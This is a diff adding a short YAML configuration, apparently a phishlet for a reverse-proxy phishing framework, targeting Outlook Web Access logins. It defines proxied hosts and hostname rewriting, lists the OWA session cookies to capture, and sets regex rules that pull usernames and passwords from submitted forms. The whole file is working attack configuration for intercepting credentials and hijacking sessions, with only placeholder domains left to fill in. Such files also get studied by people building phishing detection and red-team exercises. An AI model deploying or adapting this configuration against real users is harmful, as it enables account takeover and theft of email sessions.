@@ -1,0 +1,24 @@
+author: '@acole76'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'subdomain', orig_sub: 'subdomain', domain: 'domain.tld', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'subdomain.domain.tld', orig_sub: 'subdomain', domain: 'domain.tld', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: 'subdomain.domain.tld'
+    keys: ['AppcacheVer', 'ClientId', 'PBack', 'PrivateComputer', 'UC', 'X-BackEndCookie', 'X-OWA-CANARY', 'cadata', 'cadataIV', 'cadataKey', 'cadataSig', 'cadataTTL']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '^password$'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'subdomain.domain.tld'
+  path: '/'
+auth_urls:
+  - '/owa/manifests/.*'
+  
